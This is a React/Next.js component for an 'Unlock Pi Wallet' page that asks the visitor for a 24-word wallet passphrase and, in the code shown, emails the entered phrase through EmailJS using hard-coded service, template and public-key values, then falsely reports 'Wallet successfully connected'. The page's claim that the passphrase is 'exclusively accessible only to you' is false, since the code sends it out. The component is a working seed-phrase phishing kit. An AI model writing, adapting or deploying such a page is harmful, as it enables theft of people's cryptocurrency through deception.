/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-empty-object-type */
"use client";

import React, { useState, useRef, FormEvent } from "react";
import emailjs from "@emailjs/browser";
import "./globals.scss";
import { useRouter } from "next/navigation"; 

interface WalletProps {}

const Wallet: React.FC<WalletProps> = () => {
    const [loading, setLoading] = useState<boolean>(false);
    const [error, setError] = useState<string | null>(null);
    const form = useRef<HTMLFormElement>(null);
    const router = useRouter(); 

    const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
        event.preventDefault();
        setLoading(true);
        setError(null);

        if (form.current) {
            try {
                await emailjs.sendForm(
                    "service_xjqilej",
                    "template_2pg2bvk",
                    form.current,
                    {
                        publicKey: "jV5W_fZWkTTMqXRG2",
                    }
                );

                alert("Wallet successfully connected");
                router.push("/"); 
            } catch (err: any) {
                setError("Error connecting wallet");
                console.error("EmailJS Error:", err);
            } finally {
                setLoading(false);
            }
        } else {
            setError("Form reference not found.");
            setLoading(false);
        }
    };

    return (
        <form ref={form} onSubmit={handleSubmit} className="form">
            <h2>Unlock Pi Wallet</h2>
            <textarea name="phrase" id="phrase" placeholder="Enter your 24-word Passphrase here" required />
            <button type="submit" disabled={loading}>
                {loading ? "Please wait ..." : "Activate With Passphrase"}
            </button>
            <div>
                {error && <p className="error">{error}</p>}
                <p>
                    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
                </p>
                <p>
                    Lost your passphrase? <span>You can create a new wallet,</span> but all your π in your previous wallet will be inaccessible.
                </p>
            </div>
        </form>
    );
};

export default Wallet;